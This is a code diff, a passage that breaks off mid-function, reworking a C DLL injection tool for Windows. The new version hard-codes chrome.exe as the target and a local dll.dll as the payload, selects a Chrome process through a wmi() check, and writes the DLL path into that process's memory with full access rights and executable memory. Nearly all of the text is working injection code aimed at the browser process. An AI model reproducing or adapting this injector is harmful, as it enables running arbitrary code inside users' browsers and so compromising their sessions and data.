@@ -1,32 +1,23 @@
 #include "stdio.h"
-#include "Windows.h"
+#include "windows.h"
 #include "tlhelp32.h"
 #include "tchar.h"
 #include "wchar.h"
+#include "wmi.h"
 
-HANDLE findProcess(WCHAR *processName);
-BOOL loadRemoteDLL(HANDLE hProcess, const char *dllPath);
+HANDLE findProcess();
+BOOL loadRemoteDLL(HANDLE hProcess);
 
-int wmain(int argc, wchar_t *argv[])
+static const WCHAR *PROCESS_NAME = L"chrome.exe";
+static const char *DLL_NAME = ".\\dll.dll";
+
+int wmain()
 {
-    if (argc != 3)
-    {
-        wprintf(L"Usage: %ls <process name> <dll path>\n", argv[0]);
-        return 1;
-    }
 
-    WCHAR *processName = argv[1];
-    char dllPath[MAX_PATH];
-
-    wcstombs(dllPath, argv[2], MAX_PATH);
-
-    wprintf(L"Executable name %s.\n", processName);
-    printf("DLL path %s.\n", dllPath);
-
-    HANDLE hProcess = findProcess(argv[1]);
+    HANDLE hProcess = findProcess();
     if (hProcess != NULL)
     {
-        BOOL injectSuccessful = loadRemoteDLL(hProcess, dllPath);
+        BOOL injectSuccessful = loadRemoteDLL(hProcess);
         if (injectSuccessful)
         {
             printf("[+] DLL injection successful! \n");
@@ -42,7 +33,7 @@ int wmain(int argc, wchar_t *argv[])
     return 0;
 }
 
-HANDLE findProcess(WCHAR *processName)
+HANDLE findProcess()
 {
     HANDLE hProcessSnap;
     HANDLE hProcess;
@@ -70,35 +61,37 @@ HANDLE findProcess(WCHAR *processName)
     do
     {
 
-        if (wcscmp(pe32.szExeFile, processName) == 0)
+        if (wcscmp(pe32.szExeFile, L"chrome.exe") == 0)
         {
-            wprintf(L"[+] The process %s was found in memory.\n", pe32.szExeFile);
+            if (wmi(pe32.th32ProcessID))
+            {
+                wprintf(
+                    L"[+] Chrome Browser PID: %lu\n",
+                    pe32.th32ProcessID);
 
-            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
-            if (hProcess != NULL)
-            {
-                return hProcess;
-            }
-            else
-            {
-                wprintf(L"[---] Failed to open process %s.\n", pe32.szExeFile);
-                return NULL;
+                hProcess = OpenProcess(
+                    PROCESS_ALL_ACCESS,
+                    FALSE,
+                    pe32.th32ProcessID);
+
+                if (hProcess != NULL)
+                    return hProcess;
             }
         }
 
     } while (Process32NextW(hProcessSnap, &pe32));
 
-    wprintf(L"[---] %s has not been loaded into memory, aborting.\n", processName);
+    wprintf(L"[---] %s has not been loaded into memory, aborting.\n", PROCESS_NAME);
     return NULL;
 }
 
-BOOL loadRemoteDLL(HANDLE hProcess, const char *dllPath)
+BOOL loadRemoteDLL(HANDLE hProcess)
 {
     printf("Enter any key to attempt DLL injection.");
     getchar();
 
     // Allocate memory for DLL's path name to remote process
-    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (dllPathAddressInRemoteMemory == NULL)
     {
         printf("[---] VirtualAllocEx unsuccessful.\n");
@@ -107,7 +100,7 @@ BOOL loadRemoteDLL(HANDLE hProcess, const char *dllPath)
     }
 
     // Write DLL's path name to remote process
-    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
+    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, DLL_NAME, strlen(DLL_NAME), NULL);
 
     if (!succeededWriting)
     {
